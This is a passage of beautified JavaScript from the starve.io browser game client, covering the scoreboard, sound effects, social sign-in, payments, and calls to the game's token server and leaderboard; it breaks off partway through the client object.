                            this.id.innerHTML = '<div style="position:absolute;"> <img src="./img/scoreboard.png"style="width:250px;transform:translate(125px, -80px);"> </img> </div><div><div id="whokilled">' + xe.die.howdie + '</div></div><div class="deco" style="margin-top:35px;"></div><div class="deco"></div><div><div class="stats"> ' + We[TEXT.DAYS_SURVIVED] + " : " + xe.day + '</div><div class="stats"> ' + We[TEXT.KILL] + " : " + xe.die.kill + '</div></div><div id="flexDisplay"><div id="score"> ' + We[TEXT.SCORE] + " : " + xe.die.score + '</div><div id="breadWon"><span id="breadWonInner">0</span><img src="./img/golden-bread.png" style="width:50px;margin-left:-25px;transform: translate(37px, 8px);"></img></div></div><div><div id="points"> ' + xe.die.bank + " " + We[TEXT.POINTS] + '</div></div><div id="shop_points">' + We[TEXT.KIT_NEXT] + '</div><div style="display:inline-block;"><div class="social" id="tttwitter">' + We[TEXT.TWITTER] + '</div><div class="social" id="fffacebook">' + We[TEXT.FACEBOOK] + '</div></div><div id="bbback">' + We[TEXT.BACK_TO_THE_GAME] + "</div>",
                                this.style.display = "inline-block",
                                document.getElementById("tttwitter").addEventListener("mouseup", D2, !1),
                                document.getElementById("bbback").addEventListener("mouseup", function () {
                                    To.quit(Se.run)
                                }, !1),
                                document.getElementById("fffacebook").addEventListener("mouseup", v2, !1),
                                this.height = Math.floor(this.id.clientHeight / 2),
                                (i = new XMLHttpRequest).open("GET", W2 + "getBreadAndScore?userid=" + Y2),
                                i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                                i.onreadystatechange = function () {
                                    var e, t;
                                    4 == this.readyState && 200 == this.status && "0" !== i.responseText && (t = (e = JSON.parse(i.responseText)).b - Se.bread,
                                        Se.bread = e.b,
                                        Se.score = e.s,
                                        Se.lvl = Se.level_formula(Se.score),
                                        Se.xp_dest = Se.xp_formula(Se.score),
                                        Se.xp = 0,
                                        document.getElementById("breadWonInner").innerHTML = "" + t)
                                }
                                ,
                                i.send()
                        }
                    };
                var n, r = 0, o = function () {
                    i.update(),
                        30 != ++r ? window.setTimeout(o, 33) : i.update()
                }, a = (this.quit = function (e) {
                    !0 === i.enable_interface && (i.enable_interface = !1,
                        n = e,
                        a = -1,
                        s())
                }
                    ,
                    -1), s = function () {
                        i.update(),
                            30 == ++a ? (i.stop(),
                                i.sb.style.display = "none",
                                n()) : window.setTimeout(s, 33)
                    };
                this.is_run = !1,
                    this.stop = function () {
                        this.is_run = !1
                    }
                    ,
                    this.run = function () {
                        B2(),
                            document.getElementById("game_body").style.backgroundColor = ze.GROUND[uo.time],
                            i.sb.init(),
                            Se.trevda.style.display = "inline-block",
                            i.is_run = !0,
                            i.enable_interface = !0,
                            a = -1,
                            r = 0,
                            o()
                    }
                    ,
                    this.update = function () {
                        var e;
                        this.sb.translate.x = Math.floor(ye - 275),
                            this.sb.translate.y = Math.floor(He - this.sb.height - 28),
                            Se.trevda.translate.x = this.sb.translate.x - 350,
                            Se.trevda.translate.y = this.sb.translate.y + 0,
                            Se.trevda.update(),
                            30 == r && -1 == a || (e = -1 != a ? -(1750 / (30 - a + 1) - 48) : 30 != r ? 1500 / (r + 1) - 50 : 0,
                                this.sb.translate.y -= e),
                            this.sb.update()
                    }
                    ,
                    this.draw = function () {
                        K0(),
                            xe.alert.draw("#FFF", "#000")
                    }
            }
            function f2(e, t, i, n, r, o, a, s, _, E, u) {
                this.r = 1,
                    this.delay = e,
                    this.max_delay = e,
                    this.night = t,
                    this.day = i,
                    this.fade = n,
                    this.r_base = r,
                    this.r_seed = o,
                    this.player = a,
                    this.transition_delay = s,
                    this.source = _,
                    this.source.lx = _.x + _.w,
                    this.source.by = _.y + _.h,
                    this.outside_box = E,
                    this.inside_box = u,
                    this.inside = 0,
                    this.hackish = {
                        d: 5,
                        m: 5
                    },
                    this.effect = function () {
                        var e, t, i, n;
                        this.delay -= qe,
                            this.delay < 0 && (this.delay = this.max_delay,
                                e = P2.AMBIENCE.sound.playing(this.night),
                                t = P2.AMBIENCE.sound.playing(this.day),
                                e && !t ? (i = this.player.volume(this.night) * G2.AMB,
                                    n = (Math.random() * this.r_seed + this.r_base) * G2.AMB,
                                    this.player.fade(i, n, this.fade, this.night)) : !e && t && (i = this.player.volume(this.day) * G2.AMB,
                                        n = (Math.random() * this.r_seed + this.r_base) * G2.AMB,
                                        this.player.fade(i, n, this.fade, this.day)))
                    }
                    ,
                    this.transition = function () {
                        var e;
                        this.delay = this.max_delay,
                            this.hackish.d = this.hackish.m,
                            Fe.time ? (this.player.fade(0, this.r_base * G2.AMB, this.transition_delay, this.night),
                                this.player.play(this.night),
                                this.player.playing(this.day) && (e = this.player.volume(this.day) * G2.AMB,
                                    this.player.fade(e, 0, this.transition_delay, this.day))) : (this.player.fade(0, this.r_base * G2.AMB, this.transition_delay, this.day),
                                        this.player.play(this.day),
                                        this.player.playing(this.night) && (e = this.player.volume(this.night) * G2.AMB,
                                            this.player.fade(e, 0, this.transition_delay, this.night)))
                    }
                    ,
                    this.check = function (e) {
                        var t;
                        this.inside ? Utils.inside_box(e, this.outside_box) ? !Xe.transition && Fe.clock.now < d.DISABLE_EFFECT && (Fe.time ? this.player.playing(this.night) || (this.hackish.d -= qe,
                            this.hackish.d < 0 && this.transition()) : this.player.playing(this.day) || (this.hackish.d -= qe,
                                this.hackish.d < 0 && this.transition())) : (this.inside = 0,
                                    this.player.playing(this.night) && (t = this.player.volume(this.night) * G2.AMB,
                                        this.player.fade(t, 0, this.transition_delay, this.night)),
                                    this.player.playing(this.day) && (t = this.player.volume(this.day) * G2.AMB,
                                        this.player.fade(t, 0, this.transition_delay, this.day))) : Utils.inside_box(e, this.inside_box) && (this.inside = 1,
                                            !Xe.transition) && Fe.clock.now < d.DISABLE_EFFECT && this.transition()
                    }
                    ,
                    this.update = function (e, t) {
                        var i = e.x < this.source.x ? Xe.get_x(this.source.x) : e.x > this.source.lx ? Xe.get_x(this.source.lx) : t.x
                            , e = e.y < this.source.y ? Xe.get_y(this.source.y) : e.y > this.source.by ? Xe.get_y(this.source.by) : t.y;
                        this.player.pos(i, e, -.5, this.night),
                            this.player.pos(i, e, -.5, this.day)
                    }
            }
            function L2(e) {
                this.free = 1,
                    this.uid = 0,
                    this.mode = -1,
                    this.swim = Xe.sample.swim[e],
                    this.sand = Xe.sample.sand[e],
                    this.walk = Xe.sample.walk[e],
                    this.snow = Xe.sample.snow[e],
                    this.punch = new z2(this, P2.PUNCH.sound, Xe.samples.punch[e]),
                    this.weapon = new z2(this, P2.WEAPON.sound, Xe.samples.weapon[e]),
                    this.dig = new z2(this, P2.DIG.sound, Xe.samples.dig[e]),
                    this.sid = e,
                    this.x = 0,
                    this.y = 0,
                    this.move = 0,
                    this.delay = SOUND_PLAYER.DELAY,
                    this.pos = {
                        x: 0,
                        y: 0
                    },
                    this.ambience = P2.AMBIENCE.sound,
                    this.swing = function (e) {
                        e === d.HAND ? this.punch.play() : e === d.MISC ? this.weapon.play() : e === d.SHOVEL && this.dig.play()
                    }
                    ,
                    this.detect_position = function (e) {
                        return 0 < e.dist_sand ? SOUND_PLAYER.SAND : 0 < e.dist_water ? SOUND_PLAYER.SWIM : 0 < e.dist_winter || 0 < e.dist_lava ? SOUND_PLAYER.SNOW : SOUND_PLAYER.WALK
                    }
                    ,
                    this.init = function (e) {
                        this.free = 0,
                            this.uid = e;
                        e = Fe.fast_units[e];
                        e.sid = this.sid,
                            this.mode = this.detect_position(e),
                            this.pos.x = e.x,
                            this.pos.y = e.y
                    }
                    ,
                    this.clean = function () {
                        this.free = 1,
                            this.mode = -1,
                            this.ambience.stop(this.swim),
                            this.ambience.stop(this.sand),
                            this.ambience.stop(this.walk),
                            this.ambience.stop(this.snow)
                    }
                    ,
                    this.fade = function (e, t) {
                        var i = this.ambience.volume(e) * G2.FX;
                        this.ambience.fade(i, 0, t, e)
                    }
                    ,
                    this.update_pos = function (e, t) {
                        this.move && this.sid && e.pos(this.x, this.y, -.5, t)
                    }
                    ,
                    this.effect = function (e, t, i, n, r, o, a) {
                        var s, _;
                        this.delay = o,
                            n && this.mode === r ? (s = this.ambience.volume(e) * G2.FX,
                                this.move ? (_ = (Math.random() * i + t) * G2.FX,
                                    this.ambience.fade(s, _, a, e)) : this.ambience.fade(s, 0, a, e)) : this.mode != r && this.move ? this.ambience.fade(0, (t + i) * G2.FX, a, e) : this.move && (s = this.ambience.volume(e) * G2.FX,
                                        _ = (Math.random() * i + t) * G2.FX,
                                        this.ambience.fade(s, _, a, e)),
                            this.update_pos(this.ambience, e),
                            this.ambience.play(e)
                    }
                    ,
                    this.update = function () {
                        var e, t = Fe.fast_units[this.uid];
                        this.delay -= qe,
                            0 < this.delay || (e = 0,
                                t.x != this.pos.x || t.y != this.pos.y ? (this.move || (this.move = e = 1),
                                    this.x = Xe.get_x_ext(t.x, SOUND_PLAYER.FACTOR2),
                                    this.y = Xe.get_y_ext(t.y, SOUND_PLAYER.FACTOR2)) : this.move && (e = 1,
                                        this.move = 0),
                                this.pos.x = t.x,
                                this.pos.y = t.y,
                                (mode = this.detect_position(t)) != this.mode && (this.mode === SOUND_PLAYER.SWIM ? this.fade(this.swim, SOUND_PLAYER.FADE_SWIM) : this.mode === SOUND_PLAYER.SAND ? this.fade(this.sand, SOUND_PLAYER.FADE_SAND) : this.mode === SOUND_PLAYER.WALK ? this.fade(this.walk, SOUND_PLAYER.FADE_WALK) : this.mode === SOUND_PLAYER.SNOW && this.fade(this.snow, SOUND_PLAYER.FADE_SNOW)),
                                mode === SOUND_PLAYER.SWIM ? this.effect(this.swim, .08, .3, e, mode, SOUND_PLAYER.DELAY_SWIM, SOUND_PLAYER.FADE_SWIM) : mode === SOUND_PLAYER.SAND ? this.effect(this.sand, .2, .3, e, mode, SOUND_PLAYER.DELAY_SAND, SOUND_PLAYER.FADE_SAND) : mode === SOUND_PLAYER.WALK ? this.effect(this.walk, .3, .6, e, mode, SOUND_PLAYER.DELAY_WALK, SOUND_PLAYER.FADE_WALK) : mode === SOUND_PLAYER.SNOW && this.effect(this.snow, .1, .25, e, mode, SOUND_PLAYER.DELAY_SNOW, SOUND_PLAYER.FADE_SNOW),
                                this.mode = mode)
                    }
                    ,
                    this.check = function () {
                        var e = Fe.fast_units[this.uid];
                        return !!e || (this.clean(e),
                            !1)
                    }
            }
            var G2 = {
                AMB: 1,
                FX: 1
            }
                , d = {
                    SEA_DELAY: 12,
                    SEA_FADE: 5e3,
                    FOREST_DELAY: 12,
                    FOREST_FADE: 5e3,
                    SNOW_DELAY: 12,
                    SNOW_FADE: 5e3,
                    TRANSITION: 3e3,
                    DISABLE_EFFECT: 46e4,
                    PLAYERS: 8,
                    ITEMS: 6,
                    HAND: 1,
                    MISC: 2,
                    SHOVEL: 3
                }
                , H2 = []
                , P2 = (H2[-1] = d.HAND,
                    H2[Be.BOOK] = d.HAND,
                    H2[Be.WATERING_CAN_FULL] = d.HAND,
                    H2[Be.WRENCH] = d.MISC,
                    H2[Be.PICK_WOOD] = d.MISC,
                    H2[Be.PICK] = d.MISC,
                    H2[Be.PICK_GOLD] = d.MISC,
                    H2[Be.PICK_DIAMOND] = d.MISC,
                    H2[Be.PICK_AMETHYST] = d.MISC,
                    H2[Be.PICK_REIDITE] = d.MISC,
                    H2[Be.PIRATE_SWORD] = d.MISC,
                    H2[Be.SWORD_WOOD] = d.MISC,
                    H2[Be.SWORD] = d.MISC,
                    H2[Be.LAVA_SWORD] = d.MISC,
                    H2[Be.LAVA_SPEAR] = d.MISC,
                    H2[Be.SWORD_GOLD] = d.MISC,
                    H2[Be.SWORD_DIAMOND] = d.MISC,
                    H2[Be.SWORD_AMETHYST] = d.MISC,
                    H2[Be.SWORD_REIDITE] = d.MISC,
                    H2[Be.CRAB_SPEAR] = d.MISC,
                    H2[Be.WOOD_SPEAR] = d.MISC,
                    H2[Be.SPEAR] = d.MISC,
                    H2[Be.GOLD_SPEAR] = d.MISC,
                    H2[Be.DIAMOND_SPEAR] = d.MISC,
                    H2[Be.DRAGON_SPEAR] = d.MISC,
                    H2[Be.AMETHYST_SPEAR] = d.MISC,
                    H2[Be.AMETHYST_REIDITE] = d.MISC,
                    H2[Be.HAMMER] = d.MISC,
                    H2[Be.HAMMER_GOLD] = d.MISC,
                    H2[Be.HAMMER_DIAMOND] = d.MISC,
                    H2[Be.HAMMER_AMETHYST] = d.MISC,
                    H2[Be.HAMMER_REIDITE] = d.MISC,
                    H2[Be.SUPER_HAMMER] = d.MISC,
                    H2[Be.DRAGON_SWORD] = d.MISC,
                    H2[Be.PITCHFORK2] = d.MISC,
                    H2[Be.PITCHFORK] = d.MISC,
                    H2[Be.SHOVEL] = d.SHOVEL,
                    H2[Be.SHOVEL_GOLD] = d.SHOVEL,
                    H2[Be.SHOVEL_DIAMOND] = d.SHOVEL,
                    H2[Be.SHOVEL_AMETHYST] = d.SHOVEL,
                    (SOUND_NATURE = [])[0] = 0,
                    SOUND_NATURE[1] = 1,
                    SOUND_NATURE[2] = 1,
                    SOUND_NATURE[3] = 1,
                    SOUND_NATURE[4] = 0,
                    SOUND_NATURE[5] = 0,
                    SOUND_NATURE[6] = 0,
                    SOUND_NATURE[7] = 0,
                    SOUND_NATURE[8] = 0,
                    SOUND_NATURE[9] = 0,
                    SOUND_NATURE[10] = 1,
                    SOUND_NATURE[11] = 1,
                    SOUND_NATURE[12] = 1,
                    SOUND_NATURE[13] = 1,
                    SOUND_NATURE[14] = 1,
                    SOUND_NATURE[15] = 1,
                    SOUND_NATURE[16] = 0,
                    SOUND_NATURE[17] = 0,
                    SOUND_NATURE[18] = 0,
                    SOUND_NATURE[19] = 0,
                    SOUND_NATURE[20] = 0,
                    SOUND_NATURE[21] = 0,
                    SOUND_NATURE[22] = 0,
                    SOUND_NATURE[23] = 1,
                    SOUND_NATURE[24] = 1,
                    SOUND_NATURE[25] = 1,
                    SOUND_NATURE[26] = 1,
                    SOUND_NATURE[27] = 1,
                    SOUND_NATURE[28] = 1,
                    SOUND_NATURE[29] = 1,
                    SOUND_NATURE[30] = 1,
                    SOUND_NATURE[31] = 1,
                    SOUND_NATURE[32] = 1,
                    SOUND_NATURE[33] = 1,
                    SOUND_NATURE[34] = 1,
                    SOUND_NATURE[35] = 1,
                    SOUND_NATURE[36] = 1,
                    SOUND_NATURE[37] = 1,
                    SOUND_NATURE[38] = 1,
                    SOUND_NATURE[40] = 0,
                    SOUND_NATURE[41] = 0,
                    SOUND_NATURE[42] = 0,
                    SOUND_NATURE[50] = 1,
                    SOUND_NATURE[51] = 1,
                    SOUND_NATURE[52] = 1,
                    SOUND_NATURE[55] = 0,
                    SOUND_NATURE[56] = 0,
                    SOUND_NATURE[57] = 0,
                    SOUND_NATURE[58] = 0,
                    (SOUND_BUILD = [])[Ye.PLANT] = 0,
                    SOUND_BUILD[Ye.FIRE] = 0,
                    SOUND_BUILD[Ye.TOTEM] = 0,
                    SOUND_BUILD[Ye.BIG_FIRE] = 0,
                    SOUND_BUILD[Ye.SEED] = -1,
                    SOUND_BUILD[Ye.WHEAT_SEED] = -1,
                    SOUND_BUILD[Ye.WORKBENCH] = 0,
                    SOUND_BUILD[Ye.WALL] = 0,
                    SOUND_BUILD[Ye.BRIDGE] = 0,
                    SOUND_BUILD[Ye.PLOT] = 0,
                    SOUND_BUILD[Ye.WINDMILL] = 1,
                    SOUND_BUILD[Ye.WELL] = 1,
                    SOUND_BUILD[Ye.STONE_WALL] = 1,
                    SOUND_BUILD[Ye.GOLD_WALL] = 1,
                    SOUND_BUILD[Ye.DIAMOND_WALL] = 1,
                    SOUND_BUILD[Ye.AMETHYST_WALL] = 1,
                    SOUND_BUILD[Ye.REIDITE_WALL] = 1,
                    SOUND_BUILD[Ye.SPIKE] = 0,
                    SOUND_BUILD[Ye.STONE_SPIKE] = 1,
                    SOUND_BUILD[Ye.GOLD_SPIKE] = 1,
                    SOUND_BUILD[Ye.DIAMOND_SPIKE] = 1,
                    SOUND_BUILD[Ye.AMETHYST_SPIKE] = 1,
                    SOUND_BUILD[Ye.REIDITE_SPIKE] = 1,
                    SOUND_BUILD[Ye.WOOD_DOOR] = 0,
                    SOUND_BUILD[Ye.STONE_DOOR] = 1,
                    SOUND_BUILD[Ye.GOLD_DOOR] = 1,
                    SOUND_BUILD[Ye.DIAMOND_DOOR] = 1,
                    SOUND_BUILD[Ye.AMETHYST_DOOR] = 1,
                    SOUND_BUILD[Ye.REIDITE_DOOR] = 1,
                    SOUND_BUILD[Ye.WOOD_DOOR_SPIKE] = 0,
                    SOUND_BUILD[Ye.STONE_DOOR_SPIKE] = 1,
                    SOUND_BUILD[Ye.GOLD_DOOR_SPIKE] = 1,
                    SOUND_BUILD[Ye.DIAMOND_DOOR_SPIKE] = 1,
                    SOUND_BUILD[Ye.AMETHYST_DOOR_SPIKE] = 1,
                    SOUND_BUILD[Ye.REIDITE_DOOR_SPIKE] = 1,
                    SOUND_BUILD[Ye.FURNACE] = 1,
                    SOUND_BUILD[Ye.RESURRECTION] = 1,
                    SOUND_BUILD[Ye.EMERALD_MACHINE] = 1,
                    SOUND_BUILD[Ye.CHEST] = 0,
                {
                    DIG: {
                        sound: null,
                        path: ["audio/ambience.mp3"],
                        sprite: {
                            d0: [90086, 300, !(SOUND_BUILD[Ye.BREAD_OVEN] = 1)],
                            d1: [90391, 300, !1],
                            d2: [90684, 300, !1]
                        },
                        sample: {
                            d0: d.PLAYERS,
                            d1: d.PLAYERS,
                            d2: d.PLAYERS
                        }
                    },
                    PUNCH: {
                        sound: null,
                        path: ["audio/ambience.mp3"],
                        sprite: {
                            p0: [89303, 300, !1],
                            p1: [89549, 300, !1],
                            p2: [89815, 300, !1]
                        },
                        sample: {
                            p0: d.PLAYERS,
                            p1: d.PLAYERS,
                            p2: d.PLAYERS
                        }
                    },
                    WEAPON: {
                        sound: null,
                        path: ["audio/ambience.mp3"],
                        sprite: {
                            w0: [88195, 300, !1],
                            w1: [88473, 300, !1],
                            w2: [88751, 300, !1],
                            w3: [89025, 300, !1]
                        },
                        sample: {
                            w0: d.PLAYERS,
                            w1: d.PLAYERS,
                            w2: d.PLAYERS,
                            w3: d.PLAYERS
                        }
                    },
                    AMBIENCE: {
                        sound: null,
                        path: ["audio/ambience.mp3"],
                        sprite: {
                            cook: [100, 2800, !0],
                            seaday: [3100, 8800, !0],
                            seanight: [19882, 8301, !0],
                            forestday: [32604, 21890, !0],
                            forestnight: [54524, 11393, !0],
                            snowday: [66961, 21223, !0],
                            snownight: [66961, 21223, !0],
                            fire: [12356, 6965, !0],
                            swim: [28380, 1797, !0],
                            sand: [30562, 655, !0],
                            walk: [31658, 813, !0],
                            snow: [66014, 925, !0],
                            hwood: [91022, 400, !1],
                            hand: [91431, 400, !1],
                            hstone: [92249, 500, !1]
                        },
                        sample: {
                            cook: 1,
                            seaday: 1,
                            seanight: 1,
                            forestday: 1,
                            forestnight: 1,
                            snowday: 1,
                            snownight: 1,
                            fire: d.PLAYERS,
                            swim: d.PLAYERS,
                            sand: d.PLAYERS,
                            walk: d.PLAYERS,
                            snow: d.PLAYERS,
                            hwood: d.ITEMS,
                            hand: d.ITEMS,
                            hstone: d.ITEMS
                        }
                    }
                })
                , z2 = (SOUND_PLAYER = {
                    DELAY_SWIM: .4,
                    DELAY_SAND: .2,
                    DELAY_WALK: .2,
                    DELAY_SNOW: .2,
                    FADE_SWIM: 300,
                    FADE_SAND: 100,
                    FADE_WALK: 100,
                    FADE_SNOW: 100,
                    WALK: 0,
                    SWIM: 1,
                    SAND: 2,
                    SNOW: 3,
                    FACTOR: 4,
                    FACTOR2: 2
                },
                    function (e, t, i) {
                        this.mom = e,
                            this.c = 0,
                            this.player = t,
                            this.ids = i,
                            this.max = i.length,
                            this.play = function () {
                                this.c = (this.c + 1) % this.max;
                                var e = this.ids[this.c];
                                this.mom.update_pos(this.player, e),
                                    this.player.play(e)
                            }
                    }
                );
            window.aiptag = window.aiptag || {},
                window.aiptag.consented = !0,
                window.aiptag.cmd = window.aiptag.cmd || [],
                window.aiptag.cmd.display = window.aiptag.cmd.display || [],
                window.aiptag.cmd.player = window.aiptag.cmd.player || [];
            function B2() {
                w2.open("GET", "https://cdn.jsdelivr.net/gh/prebid/currency-file@1/latest.json?date=20190929", !0),
                    w2.send()
            }
            window.aiptag.cmd.player.push(function () {
                client.connect()
            });
            var w2 = new XMLHttpRequest
                , W2 = (w2.onreadystatechange = function () {
                    4 === this.readyState && this.status
                }
                    ,
                    "https://token.starve.io/")
                , V2 = 0
                , k2 = 1
                , K2 = void 0
                , U2 = void 0
                , Y2 = void 0
                , F2 = 0;
            window.onUserLogin = function () {
                F2 = 1
            }
                ;
            var J2, X2 = {
                access_token: "ACCESS_TOKEN"
            }, ee = document.createElement("script");
            ee.type = "text/javascript",
                ee.async = !0,
                ee.src = "https://static.xsolla.com/embed/paystation/1.0.7/widget.min.js",
                ee.addEventListener("load", function () {
                    window.XPayStationWidget.init(X2),
                        window.XPayStationWidget.on("status-done", so)
                }, !1),
                document.getElementsByTagName("head")[0].appendChild(ee),
                window.fbAsyncInit = function () {
                    window.FB.init({
                        appId: "642017356260407",
                        cookie: !0,
                        xfbml: !0,
                        version: "v3.3"
                    }),
                        window.FB.AppEvents.logPageView(),
                        to()
                }
                ,
                e = document,
                ee = "facebook-jssdk",
                J2 = e.getElementsByTagName("script")[0],
                e.getElementById(ee) || ((e = e.createElement("script")).id = ee,
                    e.src = "https://connect.facebook.net/en_US/sdk.js",
                    J2.parentNode.insertBefore(e, J2));
            function j2() {
                window.gapi.auth2.init({
                    client_id: "604822901057-k3dp7j5qpl6pnfr86rvi4r2qp20nk1oh.apps.googleusercontent.com",
                    scope: "profile"
                }).then(e => {
                    (q2 = e).isSignedIn.listen(Q2),
                        q2.currentUser.listen($2),
                        q2.isSignedIn.get() && q2.signIn(),
                        eo()
                }
                )
            }
            var q2 = void 0
                , Z2 = void 0
                , Q2 = function () { }
                , $2 = function (e) {
                    to(),
                        void 0 === U2 && void 0 !== Z2 && void 0 !== (U2 = Z2.getAuthResponse().id_token) && (K2 = V2,
                            window.onUserLogin(Y2)),
                        void 0 !== e && !0 === e.isSignedIn() && (Z2 = e,
                            window.onUserLogin(e.id))
                }
                , eo = function () {
                    q2 && (Z2 = q2.currentUser.get())
                };
            function to() {
                if (void 0 === Y2) {
                    try {
                        window.FB && window.FB.getUserID() && (Y2 = window.FB.getUserID(),
                            void 0 === U2) && window.FB.getLoginStatus(function () {
                                K2 = k2,
                                    U2 = window.FB.getAuthResponse().accessToken,
                                    window.onUserLogin(Y2)
                            })
                    } catch (e) { }
                    try {
                        Y2 = Z2.getBasicProfile().getId()
                    } catch (e) { }
                }
            }
            function io(e) {
                var t;
                Y2 && ((t = new XMLHttpRequest).open("GET", W2 + "xsolla?userid=" + Y2 + "&item=" + e),
                    t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                    t.onreadystatechange = function () {
                        4 == this.readyState && 200 == this.status && "0" !== t.responseText && (X2.access_token = t.responseText,
                            window.XPayStationWidget.init(X2),
                            window.XPayStationWidget.open())
                    }
                    ,
                    t.send())
            }
            function no(e) {
                var t = new XMLHttpRequest;
                t.open("GET", W2 + "setRegion?token=" + U2 + "&userid=" + Y2 + "&region=" + e),
                    t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                    t.onreadystatechange = function () {
                        4 === this.readyState && 200 === this.status && ("0" !== t.responseText ? Se.select_subview(Se.__SERVER_DURATION__) : Se.select_subview(Se.__GAME__))
                    }
                    ,
                    t.send()
            }
            function ro(e, t) {
                var i;
                0 < Se.spin || (Se.bread < t ? Se.select_subview(Se.__BUY__) : (Se.spin = 2,
                    Se.spin_effect = 0,
                    Se.spin_target = 100,
                    (i = new XMLHttpRequest).open("GET", W2 + "buySpin?token=" + U2 + "&userid=" + Y2 + "&spin=" + e),
                    i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                    i.onreadystatechange = function () {
                        var e;
                        4 == this.readyState && 200 == this.status && ("0" !== i.responseText ? (e = JSON.parse(i.responseText),
                            Se.play_spin(e.rand * Math.PI * 2, e.type, e.id),
                            Se.bread -= t) : Se.spin = 0)
                    }
                    ,
                    i.send()))
            }
            function oo() {
                var e, t;
                Se.bread < 300 && 0 < Se.firstName || (e = document.getElementById("account_nickname_input").value.trim(),
                    (document.getElementById("account_nickname_input").value = e).length < 1) || 20 < e.length || ((t = new XMLHttpRequest).open("GET", W2 + "changeNickname?token=" + U2 + "&userid=" + Y2 + "&nickname=" + encodeURIComponent(e)),
                        t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                        t.onreadystatechange = function () {
                            var e;
                            4 == this.readyState && 200 == this.status && "0" !== t.responseText && (0 < (e = Number(t.responseText)) && (Se.bread -= e),
                                Se.firstName = 1,
                                Se.select_subview(Se.__PROFILE__))
                        }
                        ,
                        t.send())
            }
            function ao(e, t) {
                var i;
                Se.bread < t ? Se.select_subview(Se.__BUY__) : ((i = new XMLHttpRequest).open("GET", W2 + "buyKit?token=" + U2 + "&userid=" + Y2 + "&kit=" + e),
                    i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                    i.onreadystatechange = function () {
                        var e;
                        4 == this.readyState && 200 == this.status && "0" !== i.responseText && (e = JSON.parse(i.responseText),
                            Se.bread -= t,
                            Se.kit = Date.now() + Number(e))
                    }
                    ,
                    i.send())
            }
            function so() {
                var t = new XMLHttpRequest;
                t.open("GET", W2 + "claimBread?userid=" + Y2),
                    t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                    t.onreadystatechange = function () {
                        var e;
                        4 == this.readyState && 200 == this.status && "0" !== t.responseText && (e = Number(t.responseText),
                            isNaN(e) || (Se.bread = e))
                    }
                    ,
                    t.send()
            }
            function _o(e, t, i, n) {
                var r;
                e = void 0 === e ? Se.leaderboard_range : e,
                    t = void 0 === t ? Se.leaderboard_mode : t,
                    i = void 0 === i ? Se.leaderboard_sorted : i,
                    n = void 0 === n ? Se.leaderboard_season : n,
                    e === Se.leaderboard_range && t === Se.leaderboard_mode && i === Se.leaderboard_sorted && n === Se.leaderboard_season || (Se.leaderboard_range = e,
                        Se.leaderboard_mode = t,
                        Se.leaderboard_sorted = i,
                        Se.leaderboard_season = n,
                        Se.LEADERBOARD_SEASON1 === n ? n = "0" : Se.LEADERBOARD_SEASON2 === n ? n = "1" : Se.LEADERBOARD_SEASON3 === n ? n = "2" : Se.LEADERBOARD_SEASON4 === n && (n = "3"),
                        Se.LEADERBOARD_TOTAL === t ? t = "total" : Se.LEADERBOARD_NORMAL === t ? t = "normal" : Se.LEADERBOARD_ZOMBIE === t ? t = "zombie" : Se.LEADERBOARD_VAMPIRE === t ? t = "vampire" : Se.LEADERBOARD_FOREST === t && (t = "forest"),
                        Se.LEADERBOARD_ALL === e && (e = "all"),
                        Se.LEADERBOARD_WEEK === e && (e = "week"),
                        Se.LEADERBOARD_TODAY === e && (e = "today"),
                        Se.LEADERBOARD_KILL === i ? i = "kill" : Se.LEADERBOARD_SCORE === i ? i = "score" : Se.LEADERBOARD_TIME === i && (i = "time"),
                        (r = new XMLHttpRequest).open("GET", W2 + "leaderboard?range=" + e + "&mode=" + t + "&sort=" + i + "&season=" + n),
                        r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                        r.onreadystatechange = function () {
                            if (4 == this.readyState && 200 == this.status && "0" !== r.responseText) {
                                for (var e = JSON.parse(r.responseText), t = "", i = 0; i < e.length; i++)
                                    var n = (line = e[i])[1]
                                        , t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = (t = t + '<div class="lineLeaderboard">' + '<div class="rank">') + (i + 1 + "") + "</div>") + '<div class="name">' + (n = -1 === n.indexOf("Starver#") ? window.decodeURIComponent(window.escape(window.atob(n))) : n)) + "</div>" + '<div class="lvl">') + (Se.level_formula(line[6]) + 1 + "")) + "</div>" + '<div class="kills">') + (line[5] + "")) + "</div>" + '<div class="time">') + (line[4] + "")) + "</div>" + '<div class="score">') + (line[3] + "")) + "</div>" + "</div>";
                                document.getElementById("leaderboard").innerHTML = t
                            }
                        }
                        ,
                        r.send())
            }
            window.onload = function () {
                window.gapi.load("auth2", j2)
            }
                ,
                document.getElementById("version").innerHTML = T.VERSION + ".3";
            var Se, Eo = [], uo = {
                time: Math.floor(2 * Math.random()),
                items: []
            };
            document.getElementById("game_body").style.backgroundColor = ze.GROUND[uo.time],
                uo.items.push(new s2(Ye.FIRE, 0, 0, 0, 0, Math.random() * Math.PI * 2, 2, 1)),
                uo.items.push(new s2(Ye.FRUIT, 0, 0, 0, 0, 0, 0, 5)),
                uo.items.push(new s2(Ye.WORKBENCH, 0, 0, 0, 0, Math.PI / 4, 0, 0)),
                uo.items.push(new s2(Ye.FRUIT, 0, 0, 0, 0, 0, 0, 5)),
                client = new function () {
                    var a = this;
                    this.socket = null,
                        this._current_id = 0,
                        this.server_list = [],
                        this.mode_list = [[], [], [], [], [], [], [], [], []],
                        this.selected_server = [-1, -1, -1, -1, -1, -1, -1, -1, -1],
                        this.current_mode = 0,
                        this.privateServer = 0,
                        this.xhttp = new XMLHttpRequest,
                        this.xhttp.onreadystatechange = function () {
                            4 == this.readyState && 200 == this.status ? a.fun_after(!0, 4) : a.fun_after(!1, this.readyState)
                        }
                        ,
                        this.xhttp_get = function (e, t) {
                            this.fun_after = e,
                                this.xhttp.open("GET", t, !0),
                                this.xhttp.send()
                        }
                        ,
                        this.PathfinderEnd = {
                            x: null,
                            y: null
                        },
                        this.calcAngle = function (e, t, i) {
                            return e && t ? i ? Math.atan2(t.r.y - e.r.y, t.r.x - e.r.x) : Math.atan2(t.y - e.y, t.x - e.x) : null
                        }
                        ,
                        this.WHATTHEFUCK = function (e, t) {
                            switch (e) {
